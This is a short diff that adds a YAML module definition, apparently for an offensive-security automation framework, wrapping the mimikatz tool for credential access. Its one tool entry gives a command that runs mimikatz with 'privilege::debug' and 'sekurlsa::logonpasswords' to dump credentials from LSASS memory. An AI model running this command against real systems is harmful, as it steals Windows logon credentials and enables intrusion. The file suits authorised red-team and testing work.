@@ -1,0 +1,15 @@
+name: mimikatz
+version: "1.0.0"
+description: "Credential dumping"
+author: "OMNIUS Core"
+category: credential_access
+container: tools-exploit
+enabled: false
+tools:
+  - name: mimikatz-sekurlsa
+    description: "Dump creds from LSASS"
+    category: credential_access
+    container: tools-exploit
+    command: "mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' exit"
+    output_parser: text
+    timeout: 300
